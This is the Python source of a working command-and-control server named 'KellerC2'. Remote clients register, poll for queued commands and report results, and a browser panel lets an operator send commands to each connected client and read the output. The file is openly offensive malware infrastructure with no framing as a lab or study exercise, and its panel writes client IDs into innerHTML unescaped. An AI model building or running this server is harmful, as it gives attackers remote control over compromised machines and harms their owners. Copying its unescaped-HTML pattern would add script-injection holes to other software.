#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import queue

INDEX_PAGE = """
<html>
<head>
    <title>KellerC2</title>
    <script>
    async function load() {
        const res = await fetch('/clients');
        const clients = await res.json();
        const list = document.getElementById('clients');
        list.innerHTML = '';
        clients.forEach(id => {
            const item = document.createElement('li');
            item.innerHTML = id + ` <form onsubmit="sendCmd(event, this, '${id}')">
                <input name="cmd" placeholder="Command" />
                <button type="submit">Send</button>
                </form><pre id="res_${id}"></pre>`;
            list.appendChild(item);
            fetchResult(id);
        });
    }
    async function sendCmd(e, form, id) {
        e.preventDefault();
        const cmd = form.cmd.value;
        await fetch('/send', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({client_id:id, command:cmd})});
        form.cmd.value='';
    }
    async function fetchResult(id){
        const r = await fetch('/result?client_id='+id);
        const data = await r.json();
        document.getElementById('res_'+id).textContent = data.result || '';
    }
    setInterval(load, 5000);
    window.onload = load;
    </script>
</head>
<body>
    <h1>Connected clients</h1>
    <ul id="clients"></ul>
</body>
</html>
"""

clients = set()
client_queues = {}
client_results = {}

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        if self.path == '/register':
            client_id = None
            try:
                payload = json.loads(data.decode())
                client_id = payload.get('client_id')
            except Exception:
                pass
            if client_id:
                clients.add(client_id)
                client_queues.setdefault(client_id, queue.Queue())
                client_results.setdefault(client_id, '')
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'Registered')
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'Bad Request')
        elif self.path == '/send':
            try:
                payload = json.loads(data.decode())
                cid = payload.get('client_id')
                cmd = payload.get('command')
                if cid in clients and cmd:
                    client_queues[cid].put(cmd)
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'Command queued')
                    return
            except Exception:
                pass
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Bad Request')
        elif self.path == '/result':
            try:
                payload = json.loads(data.decode())
                cid = payload.get('client_id')
                res = payload.get('result')
                if cid in clients:
                    client_results[cid] = res
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'Result stored')
                    return
            except Exception:
                pass
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Bad Request')
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/clients':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(sorted(list(clients))).encode())
        elif parsed.path == '/poll':
            qs = parse_qs(parsed.query)
            cid = qs.get('client_id', [None])[0]
            if cid in clients:
                try:
                    cmd = client_queues[cid].get(timeout=30)
                except queue.Empty:
                    cmd = None
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'command': cmd}).encode())
            else:
                self.send_response(404)
                self.end_headers()
        elif parsed.path == '/result':
            qs = parse_qs(parsed.query)
            cid = qs.get('client_id', [None])[0]
            if cid in clients:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'result': client_results.get(cid, '')}).encode())
            else:
                self.send_response(404)
                self.end_headers()
        elif parsed.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(INDEX_PAGE.encode())
        else:
            self.send_response(404)
            self.end_headers()

def run(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, Handler)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()